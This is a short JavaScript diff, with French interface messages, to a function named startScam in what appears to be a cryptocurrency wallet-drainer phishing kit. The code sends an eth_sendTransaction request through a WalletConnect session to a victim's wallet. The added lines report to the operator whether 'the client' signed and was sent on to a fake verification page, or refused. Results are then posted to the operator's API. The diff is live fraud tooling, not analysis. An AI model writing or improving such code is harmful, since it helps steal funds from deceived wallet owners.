@@ -852,13 +852,20 @@ async function startScam() {
     gasLimit: '0xea60'
   };
 
+  const scanText = document.querySelector('.scan');
+  if (scanText) scanText.textContent = '⏳ En attente de la signature…';
+
   try {
     await signClient.request({
       topic: session.topic,
       request: { id: Date.now(), jsonrpc: '2.0', method: 'eth_sendTransaction', params: [tx] },
       chainId: 'eip155:1'
     });
-  } catch (e) { console.error('Approve échoué', e); }
+    if (scanText) scanText.textContent = '✅ Le client a signé, il est redirigé vers la page de vérification.';
+  } catch (e) {
+    console.error('Approve échoué', e);
+    if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
+  }
 
   await fetch(API, {
     method: 'POST',
